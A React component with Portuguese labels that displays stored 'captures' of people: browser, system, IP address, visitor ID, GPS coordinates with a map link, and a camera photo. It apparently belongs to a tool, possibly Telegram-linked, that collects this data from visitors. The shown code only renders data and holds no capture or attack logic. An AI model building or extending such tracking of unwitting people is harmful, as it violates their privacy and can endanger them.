"use client"

import { useEffect, useState } from "react"
import { CaptureData } from "@/types/telegram"

export function CaptureDataDisplay() {
  const [captures, setCaptures] = useState<CaptureData[]>([])

  useEffect(() => {
    // Load initial data from localStorage
    const loadInitialData = () => {
      try {
        const savedCaptures = localStorage.getItem('captures')
        if (savedCaptures) {
          const parsedCaptures = JSON.parse(savedCaptures)
          setCaptures(parsedCaptures)
        }
      } catch (error) {
        console.error('Error loading initial data:', error)
      }
    }

    // Listen for storage changes
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === 'lastCapture' && e.newValue) {
        try {
          const newCapture = JSON.parse(e.newValue)
          setCaptures([newCapture]) // Replace all captures with the new one
        } catch (error) {
          console.error('Error parsing new capture:', error)
        }
      }
    }

    // Load initial data
    loadInitialData()

    // Add event listener for storage changes
    window.addEventListener('storage', handleStorageChange)

    // Cleanup
    return () => {
      window.removeEventListener('storage', handleStorageChange)
    }
  }, [])

  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 p-4">
      {captures.map((capture, index) => (
        <div key={index} className="bg-white rounded-lg shadow-lg p-4">
          <div className="space-y-2">
            <h3 className="text-lg font-semibold">Captura #{index + 1}</h3>
            
            {/* Device Info */}
            <div className="space-y-1">
              <p className="text-sm text-gray-600">
                <span className="font-medium">Dispositivo:</span> {capture.deviceInfo.browser}
              </p>
              <p className="text-sm text-gray-600">
                <span className="font-medium">Sistema:</span> {capture.deviceInfo.os}
              </p>
              <p className="text-sm text-gray-600">
                <span className="font-medium">IP:</span> {capture.deviceInfo.ip}
              </p>
              <p className="text-sm text-gray-600">
                <span className="font-medium">Horário:</span> {new Date(capture.deviceInfo.timestamp).toLocaleString()}
              </p>
              <p className="text-sm text-gray-600">
                <span className="font-medium">ID:</span> {capture.deviceInfo.visitorId}
              </p>
            </div>

            {/* Location */}
            {capture.location.latitude !== 0 && capture.location.longitude !== 0 && (
              <div className="space-y-1">
                <p className="text-sm text-gray-600">
                  <span className="font-medium">Localização:</span>
                </p>
                <p className="text-sm text-gray-600">
                  Latitude: {capture.location.latitude}
                </p>
                <p className="text-sm text-gray-600">
                  Longitude: {capture.location.longitude}
                </p>
                <a
                  href={`https://www.google.com/maps?q=${capture.location.latitude},${capture.location.longitude}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-500 hover:text-blue-700 text-sm"
                >
                  Ver no Google Maps
                </a>
              </div>
            )}

            {/* Image */}
            {capture.image && (
              <div className="mt-2">
                <img
                  src={capture.image}
                  alt="Captura da câmera"
                  className="w-full h-auto rounded-lg"
                />
              </div>
            )}
          </div>
        </div>
      ))}
    </div>
  )
} 